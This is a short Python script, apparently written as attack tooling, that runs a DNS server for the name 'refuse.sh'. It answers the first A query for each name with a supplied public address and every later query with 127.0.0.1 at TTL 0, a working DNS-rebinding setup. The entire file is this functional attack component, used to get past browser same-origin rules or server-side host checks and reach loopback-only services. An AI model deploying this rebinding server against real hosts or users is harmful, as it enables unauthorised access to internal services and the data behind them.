"""A DNS server for refuse.sh that rebinds: the first A query for a name is answered with
PUBLIC and every later one with 127.0.0.1, at TTL 0. Usage: rebind-dns.py PUBLIC"""
import socket
import sys

public = bytes(int(part) for part in sys.argv[1].split("."))
loopback = bytes([127, 0, 0, 1])
asked = {}
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.bind(("0.0.0.0", 53))
while True:
    data, peer = sock.recvfrom(512)
    end = 12
    while data[end]:
        end += data[end] + 1
    name = data[12:end]
    question = data[12:end + 5]
    qtype = int.from_bytes(data[end + 1:end + 3], "big")
    answered = b"\x00\x01" if qtype == 1 else b"\x00\x00"
    head = data[:2] + b"\x81\x80\x00\x01" + answered + b"\x00\x00\x00\x00"
    answer = b""
    if qtype == 1:
        asked[name] = asked.get(name, 0) + 1
        address = public if asked[name] == 1 else loopback
        answer = b"\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x00\x00\x04" + address
    sock.sendto(head + question + answer, peer)
